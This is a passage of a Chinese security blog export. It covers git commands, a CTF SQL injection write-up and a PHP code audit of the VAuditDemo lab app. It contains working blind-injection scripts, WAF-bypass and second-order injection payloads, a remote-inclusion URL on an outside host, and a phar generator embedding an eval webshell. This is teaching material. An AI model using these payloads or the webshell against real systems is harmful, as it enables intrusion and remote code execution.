id=\"4、合并主分区\"><a href=\"#4、合并主分区\" class=\"headerlink\" title=\"4、合并主分区\"></a>4、合并主分区</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master (主分支)</span><br><span class=\"line\">git merge origin/MoLiang</span><br><span class=\"line\">git push origin master:master //$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"5、回滚\"><a href=\"#5、回滚\" class=\"headerlink\" title=\"5、回滚\"></a>5、回滚</h3><p>主分支<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$git status //查看仓库状态</span><br><span class=\"line\">$git diff //查看本地和远程仓库的不同</span><br><span class=\"line\">$git log 查看commit的sha1值+      --pretty=oneline参数简练显示</span><br><span class=\"line\">$git log -p -2 //比对一下内容</span><br><span class=\"line\">//进行回滚到上一个版本时，此时的版本就会被删除，本地的文件内容就回滚到上一个版本时的内容，之后push到仓库</span><br><span class=\"line\">$git reset --hard b353d4653da422aa6be61696c5c6379bffd7bfc5</span><br><span class=\"line\">$git push -f -u master master //本地和远程仓库的文件内容都回到了上一个版本</span><br><span class=\"line\">//如果此时你后悔了，还想回到最新的版本中</span><br><span class=\"line\">$git reflog //61e013c HEAD@&#123;7&#125;: commit: 增加相似md5值，匹配内容</span><br><span class=\"line\">$git reset --hard 61e013c</span><br><span class=\"line\">$git push -f -u master master</span><br><span class=\"line\">//同想能达到后悔的目的</span><br></pre></td></tr></table></figure></p>\n","categories":["git"],"tags":["git","仓库"]},{"title":"一道有意思的注入题","url":"https://www.xjseck.com/2017/10/16/一道有意思的注入题/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>“平衡信息”杯-南宁市第二届网络与信息安全技术大赛 web_300题目复现</p>\n<h2 id=\"分析过程\"><a href=\"#分析过程\" class=\"headerlink\" title=\"分析过程\"></a>分析过程</h2><p>先直接上代码<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$db=&quot;db&quot;;</span><br><span class=\"line\">$db_name=&quot;###&quot;;</span><br><span class=\"line\">$db_pw=&quot;###&quot;;</span><br><span class=\"line\">$host=&quot;localhost&quot;;</span><br><span class=\"line\">$conn=mysqli_connect($host,$db_name,$db_pw,$db);</span><br><span class=\"line\">if(!$conn)&#123;</span><br><span class=\"line\">    die(mysqli_errno());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foreach($_GET as $get)&#123;</span><br><span class=\"line\">    if(is_array($get))&#123;</span><br><span class=\"line\">        foreach($get as $g)&#123;</span><br><span class=\"line\">            if(stristr($g,&apos;select&apos;)!=FALSE &amp;&amp; stristr($g,&apos;union&apos;)!=FALSE)&#123;</span><br><span class=\"line\">                die(&apos;stop attack!&apos;);</span><br><span class=\"line\">            &#125;else if(stristr($g,&apos;select&apos;)!=FALSE &amp;&amp; stristr($g,&apos;from&apos;)!=FALSE)&#123;</span><br><span class=\"line\">                die(&apos;no attack!&apos;);   </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123;</span><br><span class=\"line\">            die(&apos;stop attack!&apos;);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$id=$_GET[&apos;id&apos;];</span><br><span class=\"line\">if(is_array($id))&#123;</span><br><span class=\"line\">    $sql=&apos;select * from user where id  in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;;</span><br><span class=\"line\">    echo &quot;2=&gt;&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    $sql=&apos;select * from user where id =&apos;.$id;</span><br><span class=\"line\">    echo &quot;1=&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$result=mysqli_query($conn,$sql);</span><br><span class=\"line\">while($row=mysqli_fetch_array($result))&#123;</span><br><span class=\"line\">    printf(&quot;id: %s&lt;br&gt; Title: %s&lt;br&gt; %s&quot;,$row[0],$row[1],$row[2]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">mysqli_free_result($result);</span><br></pre></td></tr></table></figure></p>\n<p>这里有几个trick要注意</p>\n<ol>\n<li><p>首先分析一下流程<br>开始判断传入的id是否是数组如果是就需要过foreach 的if里(stristr函数)的判断<br>否则也要经过if里的判断</p>\n</li>\n<li><p>bypass点<br>stristr函数不区分大小写 返回从搜索的字符串开始，没有搜索到就返回FALSE。<br>如果$get(id的值)不是数组就直接进入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(stristr($get,&apos;select&apos;)!=FALSE &amp;&amp; stristr($get,&apos;union&apos;)!=FALSE)&#123;</span><br><span class=\"line\">        die(&apos;stop attack!&apos;);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>也就是不能同时存在select 和 union字符，这一点我们可以使用时间的盲注进行,<br>直接传入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&apos;select * from user where id =&apos;.$id;</span><br><span class=\"line\">//payload select * from user where id =1 and(select(sleep(3)))</span><br></pre></td></tr></table></figure></p>\n<p>简单的写一个bool的盲注脚本,也可以使用sqlmap跑一下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import string</span><br><span class=\"line\">str=string.ascii_letters</span><br><span class=\"line\">str=str+&apos;,&apos;</span><br><span class=\"line\">print str</span><br><span class=\"line\">url=&quot;http://127.0.0.1/&quot;</span><br><span class=\"line\">debug = 0 #当没有数据出现就中断注入</span><br><span class=\"line\">database =&apos;student&apos;</span><br><span class=\"line\">table=&apos;&apos;</span><br><span class=\"line\">for i in range(1,16):</span><br><span class=\"line\">    test=debug</span><br><span class=\"line\">    for x in str:</span><br><span class=\"line\">        #payload =&quot;?id=1 and(ascii(substr(database(),%s,1))=%s)&quot; %(i,ord(x))</span><br><span class=\"line\">        payload=&apos;?id=1 and(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x73747564656E74),%s,1))=%s)&apos; %(i,ord(x))</span><br><span class=\"line\">        u_p=url+payload</span><br><span class=\"line\">        res=requests.get(u_p)</span><br><span class=\"line\">        # print u_p</span><br><span class=\"line\">        if &quot;admin&quot; in res.content:</span><br><span class=\"line\">            table=table+x</span><br><span class=\"line\">            print &quot;table:&quot;,table</span><br><span class=\"line\">            debug=debug+1</span><br><span class=\"line\">            break</span><br><span class=\"line\">    if debug==test:</span><br><span class=\"line\">        break</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        continue</span><br></pre></td></tr></table></figure></p>\n<p>如果判断的再死一点，把union关键字换成from，也就是不能同时出现 select 和union了，没有办法遍历出数据库和表了，只能爆破表名和字段了。<br>else走不通了，那我们按照正常的if来走一遍，首先我们知道可以通过url传数组<br>也就是我们利用传数组这样的方式bypass，最终执行的sql语句就是<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&apos;select * from user where id  in(&apos;.implode(&apos;,&apos;,$id).&apos;)&apos;;</span><br></pre></td></tr></table></figure></p>\n<p>只要能绕过if中的stristr函数的检测就能拼接到sql语句中<br>另一个trick 就是我们传入数组的时候可以这样传入id[]=1&amp;id=2去绕过stristr,也可以拼接到sql语句中按照这样的一个思路<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">首先拼接 ) id[]=1)然后是stristr函数id[]= union/*  &amp;id[]=  */select 1,database(),3 #</span><br><span class=\"line\"></span><br><span class=\"line\">//$_GET[id]=$id[]= &#123;  [0] =&gt; -1) union/*     [1] =&gt; */ select 1,user(),3# &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//最终的sql=select * from user where id in(-1) union/*,*/select 1,user(),3#</span><br></pre></td></tr></table></figure></p>\n<p>成功使用布尔型的注入。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>trick点 url 传数组分段传入输入绕过stristr函数的检测</p>\n","categories":["CTF"],"tags":["CTF","WEB","PHP"]},{"title":"VAuditDemo代码审计","url":"https://www.xjseck.com/2017/09/28/VAuditDemo代码审计/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>主要参考Virink师傅的视屏带入门PHP代码审计<a href=\"https://www.ichunqiu.com/course/54473\" target=\"_blank\" rel=\"noopener\">视频地址</a><br>系统的主要编写流程比较好分析，PHP嵌套HTML开发。</p>\n<h2 id=\"审计浏览\"><a href=\"#审计浏览\" class=\"headerlink\" title=\"审计浏览\"></a>审计浏览</h2><p>大致的浏览一下系统的文件目录和配置文件说明什么的，这里的系统文件还是比较少一些，主要是浏览一下<br><strong>入口文件(index.php)、配置文件(config.php)、安装文件(install.php)、以及lib.php文件</strong><br>通过这些文件我们能大致的知道系统的一些基本配置和全局设置。我们主要关注一下lib.php文件，只要是加载了lib.php文件首先就设置了 全局变量的防护<code>($_GET、$_POST、$COOKIE)</code>都会自动加载addslashes函数<code>‘ “ null \\ 返回 \\’ \\” \\\\</code> 代码如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if( !get_magic_quotes_gpc() ) &#123;</span><br><span class=\"line\">    $_GET = sec ( $_GET );</span><br><span class=\"line\">    $_POST = sec ( $_POST );</span><br><span class=\"line\">    $_COOKIE = sec ( $_COOKIE ); </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_SERVER = sec ( $_SERVER );</span><br><span class=\"line\">function sec( &amp;$array ) &#123;</span><br><span class=\"line\">    if ( is_array( $array ) ) &#123;</span><br><span class=\"line\">        foreach ( $array as $k =&gt; $v ) &#123;</span><br><span class=\"line\">            $array [$k] = sec ( $v );</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else if ( is_string( $array ) ) &#123;</span><br><span class=\"line\">        $array = addslashes( $array );</span><br><span class=\"line\">    &#125; else if ( is_numeric( $array ) ) &#123;</span><br><span class=\"line\">        $array = intval( $array );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $array;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>然后注意后面自定义的一些安全函数是否能bypass</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function sqlwaf( $str ) &#123;</span><br><span class=\"line\">    $str = str_ireplace( &quot;and&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;or&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;from&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;execute&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;update&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;count&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;chr&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;mid&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;char&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;union&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;select&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;delete&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;insert&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;limit&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;concat&quot;, &quot;sqlwaf&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;\\\\&quot;, &quot;\\\\\\\\&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;&amp;&amp;&quot;, &quot;&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;||&quot;, &quot;&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;&apos;&quot;, &quot;&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;%&quot;, &quot;\\%&quot;, $str );</span><br><span class=\"line\">    $str = str_ireplace( &quot;_&quot;, &quot;\\_&quot;, $str );</span><br><span class=\"line\">    return $str;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>粗略的看一下后面几段出现替换为空的操作，单引号被替换为空，数字型的注入就可以，可能就会出现问题比如<code>$sql=”select * from user where $id”;</code><br>就直接bypass payload 如 an||d(sele||ct(sleep(3)))</p>\n<h2 id=\"安装问题\"><a href=\"#安装问题\" class=\"headerlink\" title=\"安装问题\"></a>安装问题</h2><p>install.php 文件开头代码如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (file_exists($_SERVER[&quot;DOCUMENT_ROOT&quot;] . &apos;/sys/install.lock&apos;)) &#123;</span><br><span class=\"line\">    header(&quot;Location: ../index.php&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure></p>\n<p>这里只是判断了install.lock 文件的存在，正常应该是存在这个文件之后就直接退出后面的操作，没有的话，后面的代码块还会继续执行，所以后面如果出现了可控的参数，一样会带入进行执行操作。<br>问题：可控参数如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$dbhost = $_POST[&quot;dbhost&quot;];</span><br><span class=\"line\">$dbuser = $_POST[&quot;dbuser&quot;];</span><br><span class=\"line\">$dbpass = $_POST[&quot;dbpass&quot;];</span><br><span class=\"line\">$dbname = $_POST[&quot;dbname&quot;];</span><br></pre></td></tr></table></figure></p>\n<p>前三个是连接数据库的信息没有办法进行写入，<code>$dbname = $_POST[“dbname”];</code><br>到变量$str_tmp中去<code>”\\$database=\\”$dbname\\”; \\r\\n”;</code><br>只要保证查询语句不出现错误<br><code>mysql_query(“CREATE DATABASE $dbname”, $con) or die(mysql_error());</code><br>创建一个不存在的数据库名就能成功写入config.php文件到目录拼接到sql语句中 “CREATE DATABASE $dbname”, $con payload如下：<br><code>dbname=test -- -“;phpinfo();”</code><br>最后的内容写到/sys/config.php中的内容为<code>$database=&quot;test -- -&quot;;phpinfo();”&quot;;</code><br>造成任意的代码写入漏洞。</p>\n<h2 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h2><p>读到index.php文件<br>module参数可控如果开启远程包含 pyload如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (isset($_GET[&apos;module&apos;])) &#123;</span><br><span class=\"line\">    include $_GET[&apos;module&apos;] . &apos;.inc&apos;; </span><br><span class=\"line\">    //php.ini 配置开启allow_url_include = On</span><br><span class=\"line\">    //这里存在远程文件包含module=http://39.108.59.30/1.txt?  </span><br><span class=\"line\">    1.txt的内容 &lt;?php phpinfo();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>如果是本地文件包含的话，可以利用上传的图片进行包含获得shell<br>比如图片上传的文件代码如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User/ updateAvatar.php</span><br><span class=\"line\">$avatar = $uploaddir . ‘/u‘. time(). ‘‘ . $_FILES[‘upfile’][‘name’];</span><br><span class=\"line\">if (move_uploaded_file($_FILES[‘upfile’][‘tmp_name’], $avatar)) &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以上传图片文件 需要爆破一下文件地址<br>然后使用phar协议包含文件<br>首先需要生成phar包文件需要把php.ini phar.readonly 设置成Off<br>然后直接浏览器访问此脚本生成一个my.phar包文件<br>如果包含文件的后缀是.php 或者inc需要改一下脚本的shell的后缀<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">try&#123;</span><br><span class=\"line\">    $p = new Phar(&quot;my.phar&quot;, 0, &apos;my.phar&apos;);</span><br><span class=\"line\">&#125; catch (UnexpectedValueException $e) &#123;</span><br><span class=\"line\">    die(&apos;Could not open my.phar&apos;);</span><br><span class=\"line\">&#125; catch (BadMethodCallException $e) &#123;</span><br><span class=\"line\">    echo &apos;technically, this cannot happen&apos;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$p-&gt;startBuffering();</span><br><span class=\"line\">$p[&apos;shell.inc&apos;] = &apos;&lt;?php phpinfo(); eval($_POST[x]); ?&gt;&apos;;</span><br><span class=\"line\">// make a file named my.phar</span><br><span class=\"line\">$p-&gt;setStub(&quot;&lt;?php</span><br><span class=\"line\">    Phar::mapPhar(&apos;myphar.phar&apos;);</span><br><span class=\"line\">__HALT_COMPILER();&quot;);</span><br><span class=\"line\">$p-&gt;stopBuffering();</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>最后的payload如下：<br><code>/index.php?module=phar://uploads/my.gif/shell</code><br><code>post x=phpinfo();</code><br>类似的伪协议还有zip  </p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>漏洞文件search.php<br>没有包含lib.php 就直接参数入sql语句，进行全局的过滤，导致注入成功。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (!empty($_GET[&apos;search&apos;])) &#123;</span><br><span class=\"line\">    $query = &quot;SELECT * FROM comment WHERE comment_text LIKE &apos;%&#123;$_GET[&apos;search&apos;]&#125;%&apos;&quot;;</span><br><span class=\"line\">    //未过滤存在sql注入</span><br><span class=\"line\">    $data = mysql_query($query, $conn);</span><br><span class=\"line\">    ?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>由于包含了config.php error_reporting(0); 只能盲注<br>由于表comment 没有数据使用sleep 貌似没有反应<br>这里使用<br>?search=%’+or if(1,benchmark(50000000,SHA1(1)),1);– -<br><strong>如果查询语句中没有返回值的话使用sleep函数是没有反应的</strong><br><img src=\"sleep.png\" alt=\"sleep\"></p>\n<h2 id=\"越权操作\"><a href=\"#越权操作\" class=\"headerlink\" title=\"越权操作\"></a>越权操作</h2><p>没有判断id是否是当前操作的用户。手工检测一般都都是修改id，是否能影响到不同用户的属性。如果是看代码一般是sql语句什么的 看不出来是存在sql注入但是如果对用户的id没有进行判读就会出现越权的操作。<br>可控点<br><code>$clean_user_id = clean_input($_POST[&#39;id&#39;]);</code><br>然后紧接着就带入sql语句中<br><code>$query = “SELECT * FROM users WHERE user_name = ‘$clean_username’”;</code><br>造成任意用户名被修改  </p>\n<h2 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h2><p>一般出现的问题是第一次入库被过滤了，但是在出库的时候没有过滤，直接带入到sql语句中。一般是update 或者insert 语句出现问题。<br>问题就出在<br>messageSub.php文件<br><code>$query = &quot;INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())&quot;;</code><br>可以看到<code>$_SESSION[‘username’]</code> 被带入sql语句中，我们搜索一下<code>$_SESSION[‘username’]</code> 在哪被赋值User/logCheck.php处出现赋值<br><code>$_SESSION[‘username’] = $row[‘user_name’];</code><br>可以发现前面是判断用户登录<br><code>$query = &quot;SELECT * FROM users WHERE user_name = &#39;$clean_name&#39; AND user_pass = SHA(&#39;$clean_pass&#39;)&quot;;</code><br>可以让形如seck\\的用户成功登录<br>返回的结果带入<code>$_SESSION[‘username’] = $row[‘user_name’];</code>进行赋值。<br>此时<code>$_SESSION[&#39;username&#39;]就等于seck\\</code><br>所以只要<strong><code>$_SESSION[&#39;username&#39;]</code></strong> 带入了sql语句中就会转义引号，就造成了二次注入。<br><strong>漏洞流程分析如下：</strong><br>sys/lib.php<br>首先加载此文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (!get_magic_quotes_gpc()) &#123;</span><br><span class=\"line\">    $_GET = sec($_GET);</span><br><span class=\"line\">    $_POST = sec($_POST);</span><br><span class=\"line\">    $_COOKIE = sec($_COOKIE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_SERVER = sec($_SERVER);</span><br><span class=\"line\">function sec(&amp;$array)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (is_array($array)) &#123;</span><br><span class=\"line\">        foreach ($array as $k =&gt; $v) &#123;</span><br><span class=\"line\">            $array[$k] = sec($v);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; else if (is_string($array)) &#123;</span><br><span class=\"line\">        $array = addslashes($array);</span><br><span class=\"line\">    &#125; else if (is_numeric($array)) &#123;</span><br><span class=\"line\">        $array = intval($array);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $array;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">会有一个全局的防注入</span><br><span class=\"line\">Addslashes自动会转义 </span><br><span class=\"line\">现在我们看一下注册用户的sql语句</span><br><span class=\"line\">User/regCheck.php</span><br><span class=\"line\">大致看了一下代码注册成功就直接赋值$_SESSION[&apos;username&apos;]，相当于完成了登录。</span><br><span class=\"line\">$clean_name = clean_input($_POST[&apos;user&apos;]);</span><br><span class=\"line\">看一下clean_input函数</span><br><span class=\"line\">function clean_input($dirty)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return mysql_real_escape_string(stripslashes($dirty));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>所以我们只要注册一个形如seck\\末尾是斜杠的用户，存储在数据库的用户名称的数据也是seck\\<br>注册seck\\用户后，<code>$_SESSION[&#39;username&#39;]</code> 的赋值实在regCheck.php文件中进行赋值的，被clean_input函数给过滤了，我们需要重新登录一下，<code>$_SESSION[&#39;username&#39;]</code> 的值才是seck\\,之后转到留言处，进行sql语句的拼接造成二次注入，查看一下messageSub.php的sql语句如下：<br><code>INSERT INTO comment(user_name,comment_text,pub_date) VALUES (&#39;{$_SESSION[&#39;username&#39;]}&#39;,&#39;$clean_message&#39;,now())</code><br>payload如下：<br><code>updatexml(1,concat(0x7e,database(),0x7e),1),2)#’</code><br><code>INSERT INTO comment(user_name,comment_text,pub_date) VALUES (‘seck\\’,’,updatexml(1,concat(0x7e,database(),0x7e),1),2)#’,now</code><br>!(sql)[erci.png]</p>\n<h2 id=\"逻辑漏洞\"><a href=\"#逻辑漏洞\" class=\"headerlink\" title=\"逻辑漏洞\"></a>逻辑漏洞</h2><p>后台登录使用验证码进行防止爆破密码，一般我们找逻辑漏洞的点一般是验证码、密码找回、参数值等<br>这里就会发现我们登录一个用户，判断验证码时，没有更新，也就是我们每一次登录，填写一次验证码就可以测试多个密码值，验证码没有失效。<br>主要代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 